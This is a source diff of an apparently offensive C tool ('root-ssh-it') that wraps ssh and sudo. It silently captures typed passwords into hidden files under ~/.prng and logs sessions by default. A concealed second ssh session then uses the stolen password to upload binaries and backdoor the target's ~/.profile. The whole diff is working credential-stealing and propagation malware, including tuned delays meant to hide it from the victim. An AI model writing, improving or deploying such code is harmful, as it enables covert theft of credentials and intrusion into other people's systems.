@@ -7,6 +7,8 @@ static fd_set rfd;
 static fd_set wfd;
 static int fd_i;     // fd of infiltrating ssh
 static IO io_i;      // IO for fd_i
+static IO io_ssh;    // IO for stdin -> real ssh
+static IO io_out;    // IO real ssh -> stdout
 static pid_t pid_i;
 static bool is_fd_i_blocking;
 static int fd_pty;   // fd of real pty
@@ -24,28 +26,48 @@ static pid_t pid_ssh;
 static char **g_argv;
 static char **g_argv_backup;
 static int g_argc_backup;
-static char *g_ssh_str;
-static bool g_is_log_ssh_credentials;
+static char *g_host_id;
+static bool g_is_already_logged_ssh_credentials;
 static int n_passwords;
 static int n_prompts;
+static int g_db_trysec;
+static bool g_is_ssh;
+static bool g_is_sudo;
+static bool g_is_skip_line;
+
 // Timeout for infiltrating process
 // Wait 30 seconds at any prompt for real user input
-#define THC_TO_WAIT_AT_PROMPT_SEC      (30)
+#define THC_TO_WAIT_AT_PROMPT_SEC           (30)
 // Give infiltrating process 2 seconds before starting real process [ssh]
 // May expire early if infiltrating process detects password prompt or completes early
-#define THC_TO_WAIT_CONNECT_SEC         (2)
+#define THC_TO_WAIT_CONNECT_SEC             (2)
+// SSH takes 2-3 seconds to report a incorrect password. Waiting for infiltrator 2-3 seconds
+// and then another 2-3 seconds for the real ssh is noticaeble to the user.
+// Instead give infiltrating ssh a head-start of 1 second and send captured
+// password (correct or wrong) to real ssh. If it was correct then likely the
+// infiltrating ssh made good use of the headstart and will have finished its job
+// before user's ~/.profile is read.
+// Continue immediatley when THCPROFILE is received.
+#define THC_TO_WAIT_PASSWORD_AUTH           (1)
+// Give infiltrating process 2 seconds to complete (successfully or failure)
+#define THC_TO_WAIT_INF_COMPLETE            (2)
 // Give infiltrating process 15 seconds to complete its job (upload all binaries etc)
-#define THC_TO_WAIT_FINISH_SEC          (15)
+#define THC_TO_WAIT_FINISH_SEC              (15)
+// Give infiltrating process 2 more seconds even if real ssh has finished.
+#define THC_TO_WAIT_FINISH_AFTER_EXIT_SEC   (2)
 static uint64_t g_i_expire;         // start + 2 seconds
 
 #define THC_BASEDIR           ".prng"
-#define THC_RECHECK_TIME      (60 * 60 * 24 * 14)  // Every 14 days re-check infiltration
-#define THC_DIRPERM           (0333)
+#define THC_DB_DIRNAME        ".d"                 // ~/.prng/.d
+#define THC_LOG_DIRNAME       ".l"                 // ~/.prng/.l
 #define THC_INF_STAGE_INSIDE  "THCINSIDE"
 #define THC_INF_STAGE_PROFILE "THCPROFILE"
 #define THC_INF_STAGE_FIN     "THCFINISHED"
+#define THC_RECHECK_TIME      (60 * 60 * 24 * 14)  // Every 14 days re-check infiltration
+#define THC_DB_TRY_SEC        (60 * 60 * 12)      // Wait at least 12h before trying again
 
 enum _stage_i_t {
+	THC_STAGE_I_NONE         = 0x00,
 	THC_STAGE_I_INSIDE       = 0x01, // Sucessfully logged in
 	THC_STAGE_I_PROFILE      = 0x02, // Target's ~/.profile infiltrated
 	THC_STAGE_I_FINISHED     = 0x03
@@ -53,14 +75,23 @@ enum _stage_i_t {
 
 enum _stage_i_t stage_i;
 
+enum _expire_action_t {
+	THC_EXP_ACTION_NONE       = 0x00,
+	THC_EXP_ACTION_UNPAUSE    = 0x01,
+	THC_EXP_ACTION_FINISH     = 0x02,
+};
+
+enum _expire_action_t g_expire_action;
+
 // Environment Variables
 // THC_IS_SESSIONLOG    - Log ssh's stdin session to THC_DB_BASEDIR/s-<host>-<port>-<user>-<timestamp>.log
 // THC_SESSIONLOG_FILE  - File for loggin sessions. Append if already exists
 // THC_BASEDIR          - Where to store binary [default ~/.prng/]
 // THC_RECHECKT_TIME    - How often to re-check that system is infiltrated (default: 14 days)
-// THC_IS_DEBUG         - Run in debug mode
+// THC_DEBUG            - Run in debug mode
 // THC_DEBUG_LOG        - File for logging debug information [default: stderr]
 // THC_VERBOSE          - Output a warning when interception is active.
+// THC_DB_TRY_SEC       - How often we should try to backdoor if we failed initially
 // THC_TARGET           - The called binary (e.g. /usr/bin/ssh)
 // THC_TARGET_NAME      - Derived from TARGET_FILE if not exist
 // THC_PS_NAME          - The name showing up in the process list (ps -alxwww), e.g. argv[0]
@@ -81,11 +112,15 @@ static void cb_lnbuf_infiltrate_ssh(void *lptr, void *arg);
 static bool strstr_password(char *str);
 static void set_state_password_captured(char *pwd);
 static void pty_ssh_start(void);
+static int db_update(const char *dbname);
+
 
 
 static void
-timeout_update(int sec)
+timeout_update(int sec, enum _expire_action_t action)
 {
+	DEBUGF_B("Setting timeout to %d seconds, action=%d\n", sec, action);
+	g_expire_action = action;
 	if (sec == 0)
 	{
 		g_i_expire = 0;
@@ -120,13 +155,15 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	char buf[1024];
 	int i;
 
-	g.is_sessionlog = false;
+	g.is_sessionlog = true;
 	g.is_debug = false;
 	g.is_path_redirect = false;
+	g_is_ssh = false;
+	g_is_sudo = false;
 	g.port = -1;
-	g.recheck_time = THC_RECHECK_TIME;
 	g.basedir_rel = THC_BASEDIR;
 	g.fd_log = -1;
+	g.fd_log_in = -1;
 	fd_i = -1;
 	fd_pty = -1;
 	fd_package = -1;
@@ -136,12 +173,16 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	g_is_pty_ssh_start = false;
 	g_is_prompt_waiting_newline_i = false;
 	pid_ssh = -1;
-	g_is_log_ssh_credentials = false;
+	g_is_already_logged_ssh_credentials = false;
 	is_fd_i_blocking = false;
 	pid_i = 0;
+	g.ssh_param[0] = '\0';
+	g.recheck_time = THC_RECHECK_TIME;
+	g_db_trysec = THC_DB_TRY_SEC;
+	g_is_pty_pause = false;
+	g_is_skip_line = false;
 
-
-	if (getenv("THC_IS_DEBUG"))
+	if (getenv("THC_DEBUG"))
 	{
 		g_dbg_fp = stderr;
 		g.is_debug = true;
@@ -150,12 +191,13 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	ptr = getenv("THC_DEBUG_LOG");
 	if (ptr != NULL)
 		g_dbg_fp = fopen(ptr, "a");
-	DEBUGF_Y("%s\n", __func__);
 
 	if (getenv("THC_IS_PATH_REDIRECT"))
 		g.is_path_redirect = true;
 
 	signal(SIGPIPE, SIG_IGN);
+
+	srandom(THC_usec());
 
 	// Determine the basedir to store binaries. Prefix with $HOME unless it
 	// starts with '/'.
@@ -171,7 +213,11 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 		g.basedir_local = strdup(buf);
 	}
 
-	g.db_basedir = g.basedir_local;
+	snprintf(buf, sizeof buf, "%s/%s", g.basedir_local, THC_DB_DIRNAME);
+	g.db_basedir = strdup(buf);
+
+	snprintf(buf, sizeof buf, "%s/%s", g.basedir_local, THC_LOG_DIRNAME);
+	g.log_basedir = strdup(buf);
 
 	g.target_file = getenv("THC_TARGET");
 
@@ -253,18 +299,29 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 
 	g.sessionlog_file = getenv("THC_SESSIONLOG_FILE");
 
+	// Set some more agressive parameters when in testing mode
+	ptr = getenv("THC_TESTING");
+	if (ptr != NULL)
+	{
+		DEBUGF_B("In TESTING-MODE\n");
+		g_db_trysec = 15;
+		g.recheck_time = 30;
+	}
+
 	ptr = getenv("THC_RECHECK_TIME");
 	if (ptr != NULL)
 		g.recheck_time = atoi(ptr);
+	ptr = getenv("THC_DB_TRY_SEC");
+	if (ptr != NULL)
+		g_db_trysec = atoi(ptr);
 
-	if (getenv("THC_IS_SESSIONLOG"))
-		g.is_sessionlog = true;
-
+	if (getenv("THC_NO_SESSIONLOG"))
+		g.is_sessionlog = false;
 
 	// Find original 'target' (absolute path to exec binary) and 'target_name' (last part of 'taget')
 	// Example: ~/.local/bin/ssh is called. The target is '/usr/bin/ssh' and target_name is 'ssh'.
 	// Ignore if THC_TARGET is set to the binary.
-	DEBUGF("exec_bin=%s\n", exec_bin);
+	DEBUGF("exec_bin    =%s\n", exec_bin);
 	g.target_name = strrchr(exec_bin, '/');
 	if (g.target_name != NULL)
 		g.target_name += 1;
@@ -282,12 +339,15 @@ init_vars(int *argc_ptr, char **argv_ptr[])
 	if (g.ps_name == NULL)
 		g.ps_name = g.target_name;
 
-	DEBUGF("target_name=%s\n", g.target_name);
-	DEBUGF("target_file=%s\n", g.target_file);
-	DEBUGF("ssh_param='%s'\n", g.ssh_param);
-	DEBUGF("ps_name=%s\n", g.ps_name);
+	DEBUGF("target_name =%s\n", g.target_name);
+	DEBUGF("target_file =%s\n", g.target_file);
+	DEBUGF("ps_name     =%s\n", g.ps_name);
+	DEBUGF("db_basedir  =%s\n", g.db_basedir);
+	DEBUGF("log_basedir =%s\n", g.log_basedir);
+	DEBUGF("session_log =%s\n", g.is_sessionlog?"true":"false");
 
 	mkdirp(g.db_basedir);
+	mkdirp(g.log_basedir);
 
 	if (getenv("THC_VERBOSE") != NULL)
 	{
@@ -337,28 +397,13 @@ pty_cmd(pid_t *pidptr, char *file, char *ps_name, char *cmd[])
 	return fd;
 }
 
-// Return TRUE if the host hasnt been infiltrated yet
-// or if infiltration happened long ago (and we shall check again).
-static bool
-db_is_need_infiltration(const char *host, int port, const char *user)
-{
-	char buf[1024];
-
-	snprintf(buf, sizeof buf, "%s/%s-%d-%s", g.db_basedir, host, port, user);
-	struct stat s;
-	if (stat(buf, &s) == 0)
-	{
-		if (s.st_mtime + g.recheck_time >= time(NULL))
-			return false; // was infiltrated recently Skip.
-	}
-
-	return true; // Needs infiltration
-}
-
 // Return 1 if state has been found.
 static int
 match(const char *str, const char *match, size_t len, enum _stage_i_t s)
 {
+	if (str == NULL)
+		return 0;
+
 	if ((stage_i < s) && (strncmp(str, match, len) == 0))
 	{
 		stage_i = s;
@@ -369,14 +414,14 @@ match(const char *str, const char *match, size_t len, enum _stage_i_t s)
 }
 
 // ssh-infiltrate login was successfull
-static void
+static bool
 match_stage_inside(const char *str)
 {
 	int ret;
 
 	ret = match(str, THC_INF_STAGE_INSIDE, strlen(THC_INF_STAGE_INSIDE), THC_STAGE_I_INSIDE);
 	if (ret == 0)
-		return;
+		return false;
 
 	// Password input no longer needed. Set to raw so that we can transfer binaries.
 	stty_set_raw(fd_i);
@@ -387,7 +432,14 @@ match_stage_inside(const char *str)
 	fd_package = open(buf, O_RDONLY, 0);
 	if (fd_package < 0)
 		DEBUGF("WARN: open(%s): %s\n", buf, strerror(errno));
-	DEBUGF("open(%s)=%d\n", buf, fd_package);
+	DEBUGF("open(%s)=%d, g_is_pty_pause=%s\n", buf, fd_package, g_is_pty_pause?"true":"false");
+	// LNs might not yet been initialized if this is password-less login
+	LNBUF_free(&g.ln_pty);
+	LNBUF_free(&g.ln_in);
+
+	timeout_update(THC_TO_WAIT_INF_COMPLETE, THC_EXP_ACTION_FINISH);
+
+	return true;
 }
 
 
@@ -401,9 +453,11 @@ match_stage_profile(const char *str)
 	if (ret == 0)
 		return;
 
-	timeout_update(THC_TO_WAIT_FINISH_SEC);
+	timeout_update(THC_TO_WAIT_FINISH_SEC, THC_EXP_ACTION_FINISH);
 	DEBUGF("I: un-pausing PTY\n");
 	g_is_pty_pause = false;
+	IO_unpause(&io_ssh);
+
 	pty_ssh_start();
 }
 
@@ -435,7 +489,10 @@ is_need_sniffing_ssh(int argc, char *argv[])
 	}
 
 	if (argv[optind] == NULL)
+	{
+		DEBUGF_R("No ssh-destiantion on command line\n");
 		return false; // No 'destination' supplied.
+	}
 
 	char *destination = strdup(argv[optind]);
 	int is_url = false;
@@ -479,10 +536,6 @@ is_need_sniffing_ssh(int argc, char *argv[])
 
 	g.host = destination;
 
-	// Check DB if destination has already been infiltrated systemwide
-	if (!db_is_need_infiltration(destination, g.port, "root"))
-		return false;
-
 	// Use current user name if no login_name is specified.
 	if (login_name != NULL)
 		g.login_name = strdup(login_name);
@@ -502,9 +555,9 @@ is_need_sniffing_ssh(int argc, char *argv[])
 		ptr += sz;
 	}
 
-
+	DEBUGF_G("ssh_param='%s'\n", g.ssh_param);
 	// HERE: not recently checked
-	DEBUGF("hostname = %s-%s-%d\n", g.login_name, g.host, g.port);
+	DEBUGF_W("hostname = %s-%s-%d\n", g.login_name, g.host, g.port);
 
 	return true;
 }
@@ -514,9 +567,6 @@ is_need_sniffing_sudo(int argc, char *argv[])
 {
 	char *user = NULL;
 	int c;
-
-	if (!db_is_need_infiltration("localhost_sudo", 0, "root"))
-		return false;
 
 	int opt_index = 0;
 	static struct option long_opts[] =
@@ -560,55 +610,105 @@ log_ssh_credentials(void)
 	char buf[1024];
 
 	DEBUGF("LOG SSH CREDENTIALS ***\n");
-	if (g_ssh_str == NULL)
+	if (g_host_id == NULL)
+	{
+		DEBUGF("g_host_id=NULL\n");
 		return; // not ssh sniffing
+	}
 
-	if (*g.ssh_param == '\0')
+	if (g_is_already_logged_ssh_credentials)
+	{
+		DEBUGF("Already logged\n");
 		return;
-
-	if (g_is_log_ssh_credentials)
-		return;
+	}
 
 	// This file might be 'sourced' by bash and thus shall be bash-compliant
-	snprintf(buf, sizeof buf, "%s/ssh-%s.pwd", g.db_basedir, g_ssh_str);
+	snprintf(buf, sizeof buf, "%s/ssh-%s.pwd", g.db_basedir, g_host_id);
 	fp = fopen(buf, "w");
 	if (fp == NULL)
+	{
+		DEBUGF_R("fopen(%s): %s\n", buf, strerror(errno));
 		return;
+	}
 
 	char *display = getenv("DISPLAY");
-	fprintf(fp, "DISPLAY=%s\n", display?display:"");
+	fprintf(fp, "LOG_DISPLAY=\"%s\"\n", display?display:"");
 
 	char *askpass = getenv("SSH_ASKPASS");
-	fprintf(fp, "SSH_ASKPASS=%s\n", askpass?askpass:"");
+	fprintf(fp, "LOG_SSH_ASKPASS=\"%s\"\n", askpass?askpass:"");
 
-	char *ptr;
-	ptr = getenv("HOME");
-	fprintf(fp, "HOME=%s\n", ptr?ptr:"");
-	ptr = getenv("PATH");
-	fprintf(fp, "PATH=%s\n", ptr?ptr:"");
-	ptr = getcwd(NULL, 0);
-	fprintf(fp, "CWD=%s\n", ptr?ptr:"");
-	XFREE(ptr);
+	fprintf(fp, "LOG_HOME=\"%s\"\n", BASH_escape(buf, sizeof buf, getenv("HOME"), '"'));
+	fprintf(fp, "LOG_PATH=\"%s\"\n", BASH_escape(buf, sizeof buf, getenv("PATH"), '"'));
+	fprintf(fp, "LOG_CWD=\"%s\"\n", BASH_escape(buf, sizeof buf, getcwd(NULL, 0), '"'));
 
 	// Log all original arguments
 	int i;
 	for (i = 0; i < g_argc_backup; i++)
-		fprintf(fp, "ARG=%s\n", g_argv_backup[i]);
+		fprintf(fp, "LOG_ARG_%d=\"%s\"\n", i, BASH_escape(buf, sizeof buf, g_argv_backup[i], '"'));
 
 	// Log password. \n provided by user input.
-	fprintf(fp, "PASSWORD=%s", g.password?g.password:"\n");
+	if (g.password == NULL)
+		buf[0] = '\0';
+	else {
+		BASH_escape(buf, sizeof buf, g.password, '"');
+		// Password is stored with '\n' or '\r\n' at the end. Strip it.
+		size_t sz = strlen(buf);
+		if ((sz > 0) && (buf[sz - 1] == '\n'))
+			buf[sz - 1] = '\0';
+	}
+	fprintf(fp, "LOG_PASSWORD=\"%s\"\n", buf);
+
+	// Log unique host id (user@hostname:port)
+	fprintf(fp, "LOG_SSH_HOST_ID=\"%s\"\n", g_host_id);
+
+	// Log ssh destination
+	fprintf(fp, "LOG_SSH_DESTINATION=\"%s\"\n", BASH_escape(buf, sizeof buf, g.ssh_destination, '"'));
 
 	// LAST LINE is always the command
 	// Log prefered command line to log in (including real target)
 
 	fprintf(fp, "# Last line is the preferred command:\n");
-	fprintf(fp, "THC_TARGET=1 %s %s\n", g_argv_backup[0], g.ssh_param);
+	// fprintf(fp, "THC_TARGET=%s %s %s\n", g.target_file, g_argv_backup[0], g.ssh_param);
+	// SSH_ASKPASS is currently not supported. To support this implement:
+	// Note: Consider that SSH_ASKPASS is only executed if password is needed
+	//       and might never be executed.
+	// - infiltrating SSH to detect if SSH_ASKPASS is set and if so then:
+	//   - Create own SSH_ASKPASS script that if executed captures password.
+	// - Modify SSH_ASKPASS for real ssh to use own script:
+	//   - If password was previously captured then just output it.
+	//   - Otherwise (faillure) fall-back to original SSH_ASKPASS
+	if (askpass == NULL)
+		buf[0] = '\0';
+	else
+		snprintf(buf, sizeof buf, "# SSH_ASPASS=-NOT_SUPPORTED- ");
+
+	fprintf(fp, "# %s%s %s %s\n", buf, g.target_file, g.ssh_param, g.ssh_destination);
 	fclose(fp);
 
-	g_is_log_ssh_credentials = true;
+	g_is_already_logged_ssh_credentials = true;
 }
 
-// Return 'false' if root-sshame is already installed system-wide on the
+static void
+log_open(int *fd_log, const char *prefix, const char *name)
+{
+	char buf[4096];
+
+	if (prefix == NULL)
+		snprintf(buf, sizeof buf, "%s/%s.log", g.log_basedir, name);
+	else
+		snprintf(buf, sizeof buf, "%s/%s-%s.log", g.log_basedir, prefix, name);
+
+	*fd_log = open(buf, O_WRONLY | O_APPEND | O_CREAT, 0600);
+	if (*fd_log < 0)
+	{
+		DEBUGF_R("open(%s): %s\n", buf, strerror(errno));
+	} else {
+		snprintf(buf, sizeof buf, "-----Starting %s-----\n", THC_logtime());
+		write(*fd_log, buf, strlen(buf));
+	}
+}
+
+// Return 'false' if root-ssh-it is already installed system-wide on the
 // destination host (e.g. root login or sudo was detected).
 // Return 'true' otherwise.
 static bool
@@ -617,18 +717,25 @@ is_need_sniffing(int argc, char *argv[])
 	bool is_sniffing_ssh = false;
 	bool is_sniffing_sudo = false;
 	char buf[1024];
+	char log_name[1024];
 
 	if (strcmp(g.target_name, "ssh") == 0)
 	{
+		g_is_ssh = true;
 		is_sniffing_ssh = is_need_sniffing_ssh(argc, argv);
 		snprintf(buf, sizeof buf, "%s@%s:%d", g.login_name, g.host, g.port);
-		g_ssh_str = strdup(buf);
-		snprintf(buf, sizeof buf, "%s/session-ssh-%s-%llu.log", g.db_basedir, g_ssh_str, (unsigned long long)time(NULL));
+		g_host_id = strdup(buf);
+		snprintf(log_name, sizeof log_name, "ssh-%s-%llu", g_host_id, (unsigned long long)time(NULL));
 	} else if (strcmp(g.target_name, "sudo") == 0) {
+		g_is_sudo = true;
 		is_sniffing_sudo = is_need_sniffing_sudo(argc, argv);
-		snprintf(buf, sizeof buf, "%s/session-sudo-%s-%llu.log", g.db_basedir, g.login_name, (unsigned long long)time(NULL));
+		snprintf(buf, sizeof buf, "%s@localhost", g.login_name);
+		g_host_id = strdup(buf);
+		snprintf(log_name, sizeof log_name, "sudo-%s-%llu", g_host_id, (unsigned long long)time(NULL));
 	} else {
-		snprintf(buf, sizeof buf, "%s/session-%s-%s-%llu.log", g.db_basedir, g.target_name, g.login_name, (unsigned long long)time(NULL));
+		snprintf(buf, sizeof buf, "%s@localhost", g.login_name);
+		g_host_id = strdup(buf);
+		snprintf(log_name, sizeof log_name, "%s-%s-%llu", g.target_name, g.login_name, (unsigned long long)time(NULL));
 	}
 
 	if ((is_sniffing_ssh == false) && (is_sniffing_sudo == false) && (g.is_sessionlog == false))
@@ -636,45 +743,41 @@ is_need_sniffing(int argc, char *argv[])
 
 	if (g.is_sessionlog)
 	{
+		// Use single log file instead (if set)
 		if (g.sessionlog_file != NULL)
-			snprintf(buf, sizeof buf, "%s", g.sessionlog_file);
+		{
 
-		DEBUGF("Logging session to '%s'\n", buf);
-		g.fd_log = open(buf, O_WRONLY | O_APPEND, 0600);
-		snprintf(buf, sizeof buf, "-----Starting %s-----\n", THC_logtime());
-		write(g.fd_log, buf, strlen(buf));
+			snprintf(buf, sizeof buf, "%s", g.sessionlog_file);
+			DEBUGF_C("Logging session to single logfile: %s\n", buf);
+			log_open(&g.fd_log, NULL, buf);
+			g.fd_log_in = g.fd_log;
+		} else {
+			DEBUGF_C("Logging session to: session-[input|output]-%s.log\n", log_name);
+			log_open(&g.fd_log, "session-output", log_name);
+			log_open(&g.fd_log_in, "session-input", log_name);
+		}
 	}
 
 	return true; // needs infiltration
 }
 
-// Return 0 on success.
-static int
-readtoIO(int sfd, IO *io)
+static void
+log_add(int *fd_ptr, void *data, ssize_t sz)
 {
-	char buf[1024 * 4];
-	ssize_t sz;
-	ssize_t ret;
-
-	sz = read(sfd, buf, sizeof buf);
+	if (fd_ptr == NULL)
+		return;
+	if (*fd_ptr < 0)
+		return;
 	if (sz <= 0)
-		return -1;
+		return;
 
-	ret = IO_write(io, buf, sz);
-	if (ret != sz)
-	{
-		DEBUGF_R("IO_write(%zd)=%zd\n", sz, ret);
-		return -2;
-	}
-
-	return 0;
+	sz = write(*fd_ptr, data, sz);
+	if (sz <= 0)
+		XCLOSE(*fd_ptr);
 }
 
-// Read from sfd and write to dfd.
-// Process data in line-buffer LNBUF (and call cb_lnbuf whenever a full line is read).
-// Return 0 on success
 static int
-readto(int sfd, int dfd, LNBUF *l, bool is_pty_pause, bool is_log)
+readtoIO(int sfd, IO *io_dst, LNBUF *l /*can be NULL*/, int *fd_log /*can be NULL*/)
 {
 	char buf[1024 * 4];
 	ssize_t sz;
@@ -682,34 +785,22 @@ readto(int sfd, int dfd, LNBUF *l, bool is_pty_pause, bool is_log)
 
 	sz = read(sfd, buf, sizeof buf);
 	if (sz <= 0)
-		return -1;
+	{
+		DEBUGF_R("read(fd=%d)=%zd: %s\n", sfd, sz, sz==0?"(EOF)":strerror(errno));
 
-	if (dfd < 0)
 		return -1;
+	}
 
-	// HEXDUMPF(buf, sz, "%d->%d\n", sfd, dfd);
 	LNBUF_add(l, buf, sz);
-
-	// LNBUF_add() may have encountered a password prompt
-	// Pause PTY until result of password from infiltrate ssh
-	// is known.
-	if (is_pty_pause)
-		return 0;
-
-	ret = write(dfd, buf, sz);
+	ret = IO_write(io_dst, buf, sz);
 	if (ret != sz)
 	{
-		DEBUGF("ERROR: write(%d, %zd)=%zd %s\n", dfd, sz, ret, strerror(errno));
+		DEBUGF_R("ERROR: IO_write(%d, %zd)=%zd %s\n", IO_get_fd(io_dst), sz, ret, strerror(errno));
 		return -1;
 	}
 
 	// Log session
-	if ((is_log) && (g.fd_log >= 0))
-	{
-		sz = write(g.fd_log, buf, sz);
-		if (sz <= 0)
-			XCLOSE(g.fd_log);
-	}
+	log_add(fd_log, buf, sz);
 
 	return 0;
 }
@@ -721,33 +812,39 @@ infiltrate_done(void)
 {
 	DEBUGF("%s (pty-pause=%d, pid_i=%d)\n", __func__, g_is_pty_pause, pid_i);
 
-	timeout_update(0);
+	timeout_update(0, THC_EXP_ACTION_NONE);
 
 	if (pid_i > 0)
 	{
 		int wstatus = -1;
-#ifdef DEBUG
 		int exit_code = -1;
 		int signal_code = -1;
-#endif
 
 		// Dont use WNOHANG: This part might be executed before pid_i turned
 		// into zombie and then we would miss clearing the Zombie.
 		if (waitpid(pid_i, &wstatus, /*WNOHANG-dontuse*/0) == pid_i)
 		{
-#ifdef DEBUG
 			if (WIFEXITED(wstatus))
 				exit_code = WEXITSTATUS(wstatus);
 			if (WIFSIGNALED(wstatus))
 				signal_code = WTERMSIG(wstatus);
-#endif
 		}
 
-		DEBUGF_W("PROCESS finished: pid=%d exit(%d) signal(%d)\n", pid_i, exit_code, signal_code);
+		DEBUGF_W("I-PROCESS finished: pid=%d exit(%d) signal(%d)\n", pid_i, exit_code, signal_code);
 		pid_i = 0;	
+		if (exit_code == 0)
+		{
+			DEBUGF_G("INFILTRATION SUCCESS\n");
+			db_update("inf");
+		} else {
+			DEBUGF_R("INFILTRATION FAILED\n");
+		}
 	}
 
+	IO_unpause(&io_ssh);
 	g_is_pty_pause = false;
+	LNBUF_free(&g.ln_in);
+	LNBUF_free(&g.ln_pty);
 	XCLOSE(fd_i);
 	IO_free(&io_i);
 	XCLOSE(fd_package);
@@ -758,7 +855,6 @@ infiltrate_done(void)
 static void
 infiltrate_prompt_found(void)
 {
-	// DEBUGF("MARK PROMPT (%d/%d)\n", n_prompts, n_passwords);
 	pty_ssh_start(); // start real ssh if not started yet
 
 	n_prompts += 1;
@@ -784,13 +880,10 @@ infiltrate_read(void)
 	if (sz <= 0)
 		goto err;
 
-	// HEXDUMPF(buf, sz, "fd_i=%d\n", fd_i);
 	LNBUF_add(&lnb_i, buf, sz);
 
 	if (g_is_waiting_at_prompt_i)
-	{
 		return 0;
-	}
 
 	// Saw 'Prompt' already and waiting for newline
 	// In rare occasions the ssh may send the password prompt in
@@ -804,22 +897,22 @@ infiltrate_read(void)
 	char *str;
 	str = LNBUF_line(&lnb_i);
 	if (strlen(str) > 0)
-		DEBUGF("Checking '%s'\n", LNBUF_line(&lnb_i));
+		DEBUGF("I: Checking '%s'\n", LNBUF_line(&lnb_i));
 	str = LNBUF_str(&lnb_i);
 	if (strstr_password(str) == false)
 		return 0;
 
-	DEBUGF("I: #%d Waiting at prompt\n", n_prompts);
-	timeout_update(THC_TO_WAIT_AT_PROMPT_SEC);
+	timeout_update(THC_TO_WAIT_AT_PROMPT_SEC, THC_EXP_ACTION_FINISH);
 	g_is_waiting_at_prompt_i = true;
 	g_is_prompt_waiting_newline_i = true;
 	// Wait for User to enter password. Then send password to infiltrating ssh
 	// before sending it to real ssh (and buffer data while doing so) STOP HERE FIXME
 	infiltrate_prompt_found();
+	DEBUGF("I: #%d Waiting at prompt (passwords captured: %d)\n", n_prompts, n_passwords);
 
 	return 0;
 err:
-	DEBUGF_C("read(%d)=%zd %s\n", fd_i, sz, strerror(errno));
+	DEBUGF_C("I: read(%d)=%zd %s\n", fd_i, sz, sz==0?"(EOF)":strerror(errno));
 	infiltrate_done();
 	return -1;
 }
@@ -828,24 +921,20 @@ err:
 static void
 i_timeout(void)
 {
+	if (g_expire_action == THC_EXP_ACTION_UNPAUSE)
+	{
+		IO_unpause(&io_ssh);
+		g_is_pty_pause = false;
+
+		timeout_update(0, THC_EXP_ACTION_NONE);
+
+		return;
+	}
+
 	if (pid_i > 0)
 		kill(pid_i, SIGKILL);
 
 	infiltrate_done();
-}
-
-static void
-io_infiltrate(void)
-{
-	infiltrate_read();
-	// DEBUGF("infiltrate_read()=%d, g_is_waiting_at_prompt_i=%d\n", n, g_is_waiting_at_prompt_i);
-	// if (n < 0)
-	// 	goto err;
-	// if (stage_i >= THC_STAGE_I_PROFILE)
-	// 	break;
-	// if (g_is_waiting_at_prompt_i)
-	// 	break;
-	// FIXME
 }
 
 static void
@@ -860,7 +949,7 @@ io_loop(void)
 		FD_ZERO(&wfd);
 
 		XFD_SET(fd_pty, &rfd);
-		if (g_is_pty_pause == false)
+		if (IO_IS_PAUSED(&io_ssh) == false) //g_is_pty_pause == false)
 			FD_SET(STDIN_FILENO, &rfd);
 		fd_max = MAX(0, fd_pty);
 
@@ -900,37 +989,55 @@ io_loop(void)
 				break;
 		}
 
-
 		// Read from USER to PTY
 		if (FD_ISSET(STDIN_FILENO, &rfd))
 		{
-			if (readto(STDIN_FILENO, fd_pty, &g.ln_in, g_is_pty_pause, g.fd_log<0?false:true) != 0)
-				break;
+
+			if (readtoIO(STDIN_FILENO, &io_ssh, &g.ln_in, &g.fd_log_in) != 0)
+			{
+				if (fd_pty >= 0)
+					break;
+				if (g_i_expire <= 0)
+					break;
+				// HERE: fd_pty already closed. Waiting in FINISH_AFTER_EXIT_SEC
+			}
 		}
 
 		// Read from PTY to USER
 		if (XFD_ISSET(fd_pty, &rfd))
 		{
-			// FIXME: shall we wait at least 2 seconds here for fd_i to finish if it hasnt finished yet?
-			if (readto(fd_pty, STDOUT_FILENO, &g.ln_pty, g_is_pty_pause, g.fd_log<0?false:true) != 0)
+			if (readtoIO(fd_pty, &io_out, &g.ln_pty, &g.fd_log) != 0)
 			{
-				fd_pty = -1;
+				IO_free(&io_ssh);
+				XCLOSE(fd_pty); // -1
+				if (g_is_waiting_at_prompt_i)
+				{
+					// Real SSH died during password prompt => User pressed CTRL-C.
+					// Not enough passwords for infiltrator to continue.
+					if (n_prompts > n_passwords)
+						break;
+				}
+
 				if (fd_i < 0)
 				{
 					DEBUGF_R("fd_i=%d\n", fd_i);
 					break;
 				}
+				timeout_update(THC_TO_WAIT_FINISH_AFTER_EXIT_SEC, THC_EXP_ACTION_FINISH);
 			}
 		}
 
 		if (XFD_ISSET(fd_i, &rfd))
 		{
-			io_infiltrate();
+			int ret;
+			ret = infiltrate_read();
+			if ((ret != 0) && (fd_pty < 0))
+				break;
 		}
 
 		if (XFD_ISSET(fd_package, &rfd))
 		{
-			if (readtoIO(fd_package, &io_i) != 0)
+			if (readtoIO(fd_package, &io_i, NULL, NULL) != 0)
 			{
 				// Keep fd_i open until THCFINISH is received.
 				DEBUGF("fd_package is DONE\n");
@@ -974,6 +1081,25 @@ cb_io(void *io_ptr, int ev_id, void *arg)
 	}
 }
 
+static void
+cb_io_ssh(void *io_ptr, int ev_id, void *arg)
+{
+	IO *io = (IO *)io_ptr;
+	if (io->fd != fd_pty)
+		return;
+
+	if (ev_id != IO_EV_ERROR)
+	{
+		DEBUGF_R("Non-Blocking events should not happen for blocking fd_pty: %d\n", ev_id);
+		return;
+	}
+
+	DEBUGF_R("Closing fd_pty=%d\n", fd_pty);
+	// HERE: EV_ERROR. write() to real ssh failed.
+	IO_free(io);
+	XCLOSE(fd_pty);
+}
+
 // Exec a separate process and try to infiltrate.
 // Wait max fo 'timeout' seconds
 // before terminating or if timeout == 0 then try in background.
@@ -995,7 +1121,6 @@ infiltrate_ssh(void)
 	setenv("THC_SSH_KF", g.keyfile?:"", 1);
 
 	snprintf(buf, sizeof buf, "%s/hook.sh", g.basedir_local);
-
 	char *cmd[] = {buf, NULL};
 
 	fd_i = pty_cmd(&pid_i, cmd[0], g.ps_name, cmd);
@@ -1007,14 +1132,14 @@ infiltrate_ssh(void)
 
 	LNBUF_init(&lnb_i, 120, fd_i /*id*/, cb_lnbuf_infiltrate_ssh, NULL);
 
-	timeout_update(THC_TO_WAIT_CONNECT_SEC);
